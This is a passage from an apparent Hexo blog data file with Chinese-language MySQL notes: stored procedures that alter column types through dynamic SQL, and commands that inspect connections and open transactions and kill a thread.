#select num;\n    IF (num=1) THEN\n      PREPARE stmt1 FROM @SQL_FOR_alter;\n      EXECUTE stmt1;\n      DEALLOCATE PREPARE stmt1 ;\n    end if;\n  END;\n\n```\n\n","slug":"数据库/mysql/mysql存储过程","published":1,"updated":"2018-07-10T13:10:10.012Z","_id":"cjjedmhdf009s0gtj5jix11j9","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h3 id=\"直接修改\"><a href=\"#直接修改\" class=\"headerlink\" title=\"直接修改\"></a>直接修改</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow()</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\"></span><br><span class=\"line\">    #DECLARE mod_row_count INT;</span><br><span class=\"line\"></span><br><span class=\"line\">    SELECT count(COLUMN_NAME)</span><br><span class=\"line\">    as mod_row_count</span><br><span class=\"line\">    FROM information_schema.columns</span><br><span class=\"line\">    WHERE table_name = &apos;bopbusitypeinfo&apos;</span><br><span class=\"line\">          AND column_name IN (&apos;acpt_category_no&apos;,&apos;acpt_category_name&apos;,&apos;param_id&apos;,&apos;param_name&apos;,&apos;need_flag&apos;,&apos;organ_flag&apos;,&apos;data_type&apos;,&apos;int_config&apos;,&apos;str_config&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF mod_row_count = 9</span><br><span class=\"line\">    THEN</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_no VARCHAR(4);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_name VARCHAR(64);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_id DECIMAL(10);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_name VARCHAR(2000);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY need_flag CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY organ_flag CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY data_type CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY int_config DECIMAL(10);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY str_config VARCHAR(255);</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\"></span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow();</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"定义分隔符\"><a href=\"#定义分隔符\" class=\"headerlink\" title=\"定义分隔符\"></a>定义分隔符</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delimiter //</span><br><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow()</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">  select 1+1 from dual;</span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow();</span><br><span class=\"line\">//</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"带参数的\"><a href=\"#带参数的\" class=\"headerlink\" title=\"带参数的\"></a>带参数的</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow(IN dbname VARCHAR(255),IN tablename VARCHAR(255),IN cloumname VARCHAR(255),IN descripe VARCHAR(1000))</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">    DECLARE mod_row_count INT;</span><br><span class=\"line\">    SET @dbname = dbname;</span><br><span class=\"line\">    SET @tablename = tablename;</span><br><span class=\"line\">    SET @cloumname = cloumname;</span><br><span class=\"line\">    SET @descripe = descripe;</span><br><span class=\"line\"></span><br><span class=\"line\">    SELECT count(COLUMN_NAME)</span><br><span class=\"line\">    INTO mod_row_count</span><br><span class=\"line\">    FROM information_schema.columns</span><br><span class=\"line\">    WHERE table_name = @tablename</span><br><span class=\"line\">          AND column_name = @cloumname;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF mod_row_count = 1</span><br><span class=\"line\">    THEN</span><br><span class=\"line\">      SET @insertSql = @descripe;</span><br><span class=\"line\">      PREPARE stmtinsert FROM @insertSql;</span><br><span class=\"line\">      EXECUTE stmtinsert;</span><br><span class=\"line\">      DEALLOCATE PREPARE stmtinsert;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow(&apos;hselite&apos;,&apos;accept&apos;,&apos;prof_flag&apos;,&apos;ALTER TABLE hselite.accept MODIFY prof_flag VARCHAR(4)&apos;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"动态sql\"><a href=\"#动态sql\" class=\"headerlink\" title=\"动态sql\"></a>动态sql</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS hselite.pro_mod_tab_col;</span><br><span class=\"line\">CREATE DEFINER=`root`@`%` PROCEDURE `pro_mod_tab_col`(IN ddname varchar(64),IN talname varchar(64),IN colname varchar(64),IN typename varchar(64),IN commt varchar(64),IN def_var varchar(64))</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">    DECLARE num VARCHAR(100);</span><br><span class=\"line\">    declare l_tab_name varchar(100); #表名</span><br><span class=\"line\">    declare l_dd_name varchar(100);  #库名</span><br><span class=\"line\">    declare l_col_name varchar(100); #字段名</span><br><span class=\"line\">    declare l_type_name varchar(100); #字段类型</span><br><span class=\"line\">    declare l_commt varchar(100);  #注释</span><br><span class=\"line\">    declare l_def_var varchar(100);  #默认值</span><br><span class=\"line\">    declare SQL_FOR_alter varchar(500);  ##动态sql</span><br><span class=\"line\"></span><br><span class=\"line\">    set @l_dd_name=ddname ;</span><br><span class=\"line\">    set @l_tab_name=talname;</span><br><span class=\"line\">    set @l_col_name=colname;</span><br><span class=\"line\">    set @l_type_name=typename;</span><br><span class=\"line\">    set @l_commt=commt;</span><br><span class=\"line\">    set @l_def_var=def_var;</span><br><span class=\"line\"></span><br><span class=\"line\">    set @SQL_FOR_alter=CONCAT(&quot;ALTER TABLE &quot; ,@l_dd_name,&apos;.&apos;,@l_tab_name, &quot; MODIFY &quot;,@l_col_name,&apos; &apos;,@l_type_name ,&quot; DEFAULT &apos;&quot; ,@l_def_var,&quot;&apos; not null COMMENT &apos;&quot;, @l_commt,&quot; &apos;;&quot;);</span><br><span class=\"line\">    #select  @SQL_FOR_alter;</span><br><span class=\"line\">    select count(1) into num from information_schema.columns WHERE table_schema=@l_dd_name and table_name = @l_tab_name AND column_name =@l_col_name;</span><br><span class=\"line\">    #select num;</span><br><span class=\"line\">    IF (num=1) THEN</span><br><span class=\"line\">      PREPARE stmt1 FROM @SQL_FOR_alter;</span><br><span class=\"line\">      EXECUTE stmt1;</span><br><span class=\"line\">      DEALLOCATE PREPARE stmt1 ;</span><br><span class=\"line\">    end if;</span><br><span class=\"line\">  END;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h3 id=\"直接修改\"><a href=\"#直接修改\" class=\"headerlink\" title=\"直接修改\"></a>直接修改</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow()</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\"></span><br><span class=\"line\">    #DECLARE mod_row_count INT;</span><br><span class=\"line\"></span><br><span class=\"line\">    SELECT count(COLUMN_NAME)</span><br><span class=\"line\">    as mod_row_count</span><br><span class=\"line\">    FROM information_schema.columns</span><br><span class=\"line\">    WHERE table_name = &apos;bopbusitypeinfo&apos;</span><br><span class=\"line\">          AND column_name IN (&apos;acpt_category_no&apos;,&apos;acpt_category_name&apos;,&apos;param_id&apos;,&apos;param_name&apos;,&apos;need_flag&apos;,&apos;organ_flag&apos;,&apos;data_type&apos;,&apos;int_config&apos;,&apos;str_config&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF mod_row_count = 9</span><br><span class=\"line\">    THEN</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_no VARCHAR(4);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_name VARCHAR(64);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_id DECIMAL(10);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_name VARCHAR(2000);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY need_flag CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY organ_flag CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY data_type CHAR(1);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY int_config DECIMAL(10);</span><br><span class=\"line\">      ALTER TABLE hselite.bopbusitypeinfo MODIFY str_config VARCHAR(255);</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\"></span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow();</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"定义分隔符\"><a href=\"#定义分隔符\" class=\"headerlink\" title=\"定义分隔符\"></a>定义分隔符</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delimiter //</span><br><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow()</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">  select 1+1 from dual;</span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow();</span><br><span class=\"line\">//</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"带参数的\"><a href=\"#带参数的\" class=\"headerlink\" title=\"带参数的\"></a>带参数的</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS modrow;</span><br><span class=\"line\">CREATE PROCEDURE modrow(IN dbname VARCHAR(255),IN tablename VARCHAR(255),IN cloumname VARCHAR(255),IN descripe VARCHAR(1000))</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">    DECLARE mod_row_count INT;</span><br><span class=\"line\">    SET @dbname = dbname;</span><br><span class=\"line\">    SET @tablename = tablename;</span><br><span class=\"line\">    SET @cloumname = cloumname;</span><br><span class=\"line\">    SET @descripe = descripe;</span><br><span class=\"line\"></span><br><span class=\"line\">    SELECT count(COLUMN_NAME)</span><br><span class=\"line\">    INTO mod_row_count</span><br><span class=\"line\">    FROM information_schema.columns</span><br><span class=\"line\">    WHERE table_name = @tablename</span><br><span class=\"line\">          AND column_name = @cloumname;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF mod_row_count = 1</span><br><span class=\"line\">    THEN</span><br><span class=\"line\">      SET @insertSql = @descripe;</span><br><span class=\"line\">      PREPARE stmtinsert FROM @insertSql;</span><br><span class=\"line\">      EXECUTE stmtinsert;</span><br><span class=\"line\">      DEALLOCATE PREPARE stmtinsert;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">  END;</span><br><span class=\"line\">CALL modrow(&apos;hselite&apos;,&apos;accept&apos;,&apos;prof_flag&apos;,&apos;ALTER TABLE hselite.accept MODIFY prof_flag VARCHAR(4)&apos;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"动态sql\"><a href=\"#动态sql\" class=\"headerlink\" title=\"动态sql\"></a>动态sql</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DROP PROCEDURE IF EXISTS hselite.pro_mod_tab_col;</span><br><span class=\"line\">CREATE DEFINER=`root`@`%` PROCEDURE `pro_mod_tab_col`(IN ddname varchar(64),IN talname varchar(64),IN colname varchar(64),IN typename varchar(64),IN commt varchar(64),IN def_var varchar(64))</span><br><span class=\"line\">  BEGIN</span><br><span class=\"line\">    DECLARE num VARCHAR(100);</span><br><span class=\"line\">    declare l_tab_name varchar(100); #表名</span><br><span class=\"line\">    declare l_dd_name varchar(100);  #库名</span><br><span class=\"line\">    declare l_col_name varchar(100); #字段名</span><br><span class=\"line\">    declare l_type_name varchar(100); #字段类型</span><br><span class=\"line\">    declare l_commt varchar(100);  #注释</span><br><span class=\"line\">    declare l_def_var varchar(100);  #默认值</span><br><span class=\"line\">    declare SQL_FOR_alter varchar(500);  ##动态sql</span><br><span class=\"line\"></span><br><span class=\"line\">    set @l_dd_name=ddname ;</span><br><span class=\"line\">    set @l_tab_name=talname;</span><br><span class=\"line\">    set @l_col_name=colname;</span><br><span class=\"line\">    set @l_type_name=typename;</span><br><span class=\"line\">    set @l_commt=commt;</span><br><span class=\"line\">    set @l_def_var=def_var;</span><br><span class=\"line\"></span><br><span class=\"line\">    set @SQL_FOR_alter=CONCAT(&quot;ALTER TABLE &quot; ,@l_dd_name,&apos;.&apos;,@l_tab_name, &quot; MODIFY &quot;,@l_col_name,&apos; &apos;,@l_type_name ,&quot; DEFAULT &apos;&quot; ,@l_def_var,&quot;&apos; not null COMMENT &apos;&quot;, @l_commt,&quot; &apos;;&quot;);</span><br><span class=\"line\">    #select  @SQL_FOR_alter;</span><br><span class=\"line\">    select count(1) into num from information_schema.columns WHERE table_schema=@l_dd_name and table_name = @l_tab_name AND column_name =@l_col_name;</span><br><span class=\"line\">    #select num;</span><br><span class=\"line\">    IF (num=1) THEN</span><br><span class=\"line\">      PREPARE stmt1 FROM @SQL_FOR_alter;</span><br><span class=\"line\">      EXECUTE stmt1;</span><br><span class=\"line\">      DEALLOCATE PREPARE stmt1 ;</span><br><span class=\"line\">    end if;</span><br><span class=\"line\">  END;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n"},{"title":"阻塞，连接数，查看事务","date":"2018-07-10T13:09:19.000Z","_content":"查看链接数\n```\nmysql> show processlist;\n+-------+------+-----------------------+---------+---------+------+-------+------------------+\n| Id    | User | Host                  | db      | Command | Time | State | Info             |\n+-------+------+-----------------------+---------+---------+------+-------+------------------+\n|     1 | scm  | localhost:42098       | cm      | Sleep   |   55 |       | NULL             |\n|     2 | scm  | localhost:42099       | cm      | Sleep   |   55 |       | NULL             |\n|     3 | scm  | localhost:42100       | cm      | Sleep   |    2 |       | NULL             |\n|     4 | scm  | localhost:42101       | cm      | Sleep   |   55 |       | NULL             |\n```\n查看未完成的事务\n```\nmysql> select * from information_schema.innodb_trx\\G\n*************************** 1. row ***************************\n                    trx_id: 11366774\n                 trx_state: RUNNING\n               trx_started: 2017-11-21 09:29:11\n     trx_requested_lock_id: NULL\n          trx_wait_started: NULL\n                trx_weight: 0\n       trx_mysql_thread_id: 28961\n                 trx_query: NULL\n       trx_operation_state: NULL\n         trx_tables_in_use: 0\n         trx_tables_locked: 0\n          trx_lock_structs: 0\n     trx_lock_memory_bytes: 360\n           trx_rows_locked: 0\n         trx_rows_modified: 0\n   trx_concurrency_tickets: 0\n       trx_isolation_level: REPEATABLE READ\n         trx_unique_checks: 1\n    trx_foreign_key_checks: 1\ntrx_last_foreign_key_error: NULL\n trx_adaptive_hash_latched: 0\n trx_adaptive_hash_timeout: 10000\n          trx_is_read_only: 0\ntrx_autocommit_non_locking: 0\n1 row in set (0.00 sec)\n\nmysql> kill 28961;\nQuery OK, 0 rows affected (0.00 sec)\n```","source":"_posts/数据库/mysql/阻塞，连接数，查看事务.md","raw":"---\ntitle: 阻塞，连接数，查看事务\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n查看链接数\n```\nmysql> show processlist;\n+-------+------+-----------------------+---------+---------+------+-------+------------------+\n| Id    | User | Host                  | db      | Command | Time | State | Info             |\n+-------+------+-----------------------+---------+---------+------+-------+------------------+\n|     1 | scm  | localhost:42098       | cm      | Sleep   |   55 |       | NULL             |\n|     2 | scm  | localhost:42099       | cm      | Sleep   |   55 |       | NULL             |\n|     3 | scm  | localhost:42100       | cm      | Sleep   |    2 |       | NULL             |\n|     4 | scm  | localhost:42101       | cm      | Sleep   |   55 |       | NULL             |\n```\n查看未完成的事务\n```\nmysql> select * from information_schema.innodb_trx\\G\n*************************** 1. row ***************************\n                    trx_id: 11366774\n                 trx_state: RUNNING\n               trx_started: 2017-11-21 09:29:11\n     trx_requested_lock_id: NULL\n          trx_wait_started: NULL\n                trx_weight: 0\n       trx_mysql_thread_id: 28961\n                 trx_query: NULL\n       trx_operation_state: NULL\n         trx_tables_in_use: 0\n         trx_tables_locked: 0\n          trx_lock_structs: 0\n     trx_lock_memory_bytes: 360\n           trx_rows_locked: 0\n         trx_rows_modified: 0\n   trx_concurrency_tickets: 0\n       trx_isolation_level: REPEATABLE READ\n         trx_unique_checks: 1\n    trx_foreign_key_checks: 1\ntrx_last_foreign_key_error: NULL\n trx_adaptive_hash_latched: 0\n trx_adaptive_hash_timeout: 10000\n          trx_is_read_only: 0\ntrx_autocommit_non_locking: 0\n1 row in set (0.00 sec)\n\nmysql> kill 28961;\nQuery OK, 0 rows affected (0.00 sec)\n```","slug":"数据库/mysql/阻塞，连接数，查看事务","published":1,"updated":"2018-07-10T13:10:10.015Z","_id":"cjjedmhdh009t0gtjelngbd1n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看链接数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show processlist;</span><br><span class=\"line\">+-------+------+-----------------------+---------+---------+------+-------+------------------+</span><br><span class=\"line\">| Id    | User | Host                  | db      | Command | Time | State | Info             |</span><br><span class=\"line\">+-------+------+-----------------------+---------+---------+------+-------+------------------+</span><br><span class=\"line\">|     1 | scm  | localhost:42098       | cm      | Sleep   |   55 |       | NULL             |</span><br><span class=\"line\">|     2 | scm  | localhost:42099       | cm      | Sleep   |   55 |       | NULL             |</span><br><span class=\"line\">|     3 | scm  | localhost:42100       | cm      | Sleep   |    2 |       | NULL             |</span><br><span class=\"line\">|     4 | scm  | localhost:42101       | cm      | Sleep   |   55 |       | NULL             |</span><br></pre></td></tr></table></figure></p>\n<p>查看未完成的事务<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from information_schema.innodb_trx\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">                    trx_id: 11366774</span><br><span class=\"line\">                 trx_state: RUNNING</span><br><span class=\"line\">               trx_started: 2017-11-21 09:29:11</span><br><span class=\"line\">     trx_requested_lock_id: NULL</span><br><span class=\"line\">          trx_wait_started: NULL</span><br><span class=\"line\">                trx_weight: 0</span><br><span class=\"line\">       trx_mysql_thread_id: 28961</span><br><span class=\"line\">                 trx_query: NULL</span><br><span class=\"line\">       trx_operation_state: NULL</span><br><span class=\"line\">         trx_tables_in_use: 0</span><br><span class=\"line\">         trx_tables_locked: 0</span><br><span class=\"line\">          trx_lock_structs: 0</span><br><span class=\"line\">     trx_lock_memory_bytes: 360</span><br><span class=\"line\">           trx_rows_locked: 0</span><br><span class=\"line\">         trx_rows_modified: 0</span><br><span class=\"line\">   trx_concurrency_tickets: 0</span><br><span class=\"line\">       trx_isolation_level: REPEATABLE READ</span><br><span class=\"line\">         trx_unique_checks: 1</span><br><span class=\"line\">    trx_foreign_key_checks: 1</span><br><span class=\"line\">trx_last_foreign_key_error: NULL</span><br><span class=\"line\"> trx_adaptive_hash_latched: 0</span><br><span class=\"line\"> trx_adaptive_hash_timeout: 10000</span><br><span class=\"line\">          trx_is_read_only: 0</span><br><span class=\"line\">trx_autocommit_non_locking: 0</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; kill 28961;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>查看链接数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show processlist;</span><br><span class=\"line\">+-------+------+-----------------------+---------+---------+------+-------+------------------+</span><br><span class=\"line\">| Id    | User | Host                  | db      | Command | Time | State | Info             |</span><br><span class=\"line\">+-------+------+-----------------------+---------+---------+------+-------+------------------+</span><br><span class=\"line\">|     1 | scm  | localhost:42098       | cm      | Sleep   |   55 |       | NULL             |</span><br><span class=\"line\">|     2 | scm  | localhost:42099       | cm      | Sleep   |   55 |       | NULL             |</span><br><span class=\"line\">|     3 | scm  | localhost:42100       | cm      | Sleep   |    2 |       | NULL             |</span><br><span class=\"line\">|     4 | scm  | localhost:42101       | cm      | Sleep   |   55 |       | NULL             |</span><br></pre></td></tr></table></figure></p>\n<p>查看未完成的事务<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from information_schema.innodb_trx\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">                    trx_id: 11366774</span><br><span class=\"line\">                 trx_state: RUNNING</span><br><span class=\"line\">               trx_started: 2017-11-21 09:29:11</span><br><span class=\"line\">     trx_requested_lock_id: NULL</span><br><span class=\"line\">          trx_wait_started: NULL</span><br><span class=\"line\">                trx_weight: 0</span><br><span class=\"line\">       trx_mysql_thread_id: 28961</span><br><span class=\"line\">                 trx_query: NULL</span><br><span class=\"line\">       trx_operation_state: NULL</span><br><span class=\"line\">         trx_tables_in_use: 0</span><br><span class=\"line\">         trx_tables_locked: 0</span><br><span class=\"line\">          trx_lock_structs: 0</span><br><span class=\"line\">     trx_lock_memory_bytes: 360</span><br><span class=\"line\">           trx_rows_locked: 0</span><br><span class=\"line\">         trx_rows_modified: 0</span><br><span class=\"line\">   trx_concurrency_tickets: 0</span><br><span class=\"line\">       trx_isolation_level: REPEATABLE READ</span><br><span class=\"line\">         trx_unique_checks: 1</span><br><span class=\"line\">    trx_foreign_key_checks: 1</span><br><span class=\"line\">trx_last_foreign_key_error: NULL</span><br><span class=\"line\"> trx_adaptive_hash_latched: 0</span><br><span class=\"line\"> trx_adaptive_hash_timeout: 10000</span><br><span class=\"line\">          trx_is_read_only: 